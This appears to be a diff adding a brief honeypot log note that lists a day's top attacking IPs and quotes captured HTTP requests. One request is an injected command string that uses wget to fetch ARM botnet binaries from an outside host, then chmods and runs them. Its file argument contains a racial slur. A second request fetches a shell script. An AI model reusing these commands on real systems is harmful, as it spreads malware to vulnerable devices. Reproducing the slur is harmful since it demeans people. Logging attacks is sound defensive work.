@@ -1,0 +1,31 @@
+Top 5 IPs for todays date
+
+46.19.139.138
+118.47.124.105
+139.59.147.146
+211.197.66.13
+59.23.122.231
+
+
+Top malware seen :
+
+Interesting observation , User Agent same as yesterday.
+
+GET /shell?cd+/tmp;rm+gangbang.arm+gangbang.arm7;wget+http://185.150.26. 253/gangbang.arm7;chmod+777+gangbang.arm7;./gangbang.arm7+nigger.arm7;wget+http://185.150.26. 253/gangbang.arm;chmod+777+gangbang.arm;./gangbang.arm+nigger.arm HTTP/1.1
+Host: 3.236.225.100:5500
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: KrebsOnSecurity
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+
+Another interesting sample:
+
+GET /w.sh HTTP/1.1
+Host: 94.156.6.92
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
